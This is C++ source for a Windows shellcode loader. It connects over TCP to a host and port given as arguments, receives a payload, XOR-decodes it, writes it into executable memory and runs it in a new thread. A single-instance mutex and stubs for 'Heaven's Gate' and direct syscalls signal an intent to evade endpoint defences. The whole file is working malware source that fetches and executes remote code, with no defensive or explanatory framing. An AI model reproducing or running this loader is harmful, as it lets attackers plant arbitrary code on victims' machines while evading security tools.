#include <winsock2.h>
#include <ws2tcpip.h> 
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/INCREMENTAL:NO")

void directsyscalls()
{
    //
    return;
}

void HeavensGate()
{
    directsyscalls();
    std::cout << "[+] Direct Syscall done!" << std::endl;
}

void getPayload(SOCKET socket, char* buffer, int bufferSize)
{
    recv(socket, buffer, bufferSize, 0);
}

void allocateMemoryAndExecutePayload(char* buffer, int bufferSize)
{
    // In v2 change by NtAllocateVirtualMemory and direct syscalls
    LPVOID m = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(m, buffer, bufferSize);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)m, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
}

int payload(PCSTR host, u_short port)
{
    char buffer[4096] = { 0 }; // Initialize buffer with zeros
    WORD version = MAKEWORD(2, 2);
    WSADATA data;
    if (WSAStartup(version, &data) != 0) {
        return -1;
    }
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &address.sin_addr) <= 0) {
        closesocket(clientSocket);
        WSACleanup();
        return -1;
    }
    if (connect(clientSocket, (sockaddr*)&address, sizeof(address)) < 0) {
        closesocket(clientSocket);
        WSACleanup();
        return -1;
    }
    getPayload(clientSocket, buffer, sizeof(buffer));
    closesocket(clientSocket);
    WSACleanup();
    for (int i = 0; i < sizeof(buffer); i++) {
        buffer[i] = buffer[i] ^ 'a';
    }
    allocateMemoryAndExecutePayload(buffer, sizeof(buffer));
    return 0;
}

int main(int argc, char** argv) {
    
    //If other instance is running, exit
    HANDLE mutexHandle = CreateMutex(NULL, TRUE, "mutant_sardaukar00");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutexHandle);
        return 0;
    }

    if (argc != 3) {
        std::cout << "loader.exe peer port" << std::endl;
    }
    else {
        payload(argv[1], atoi(argv[2]));
    }
    return 0;
}
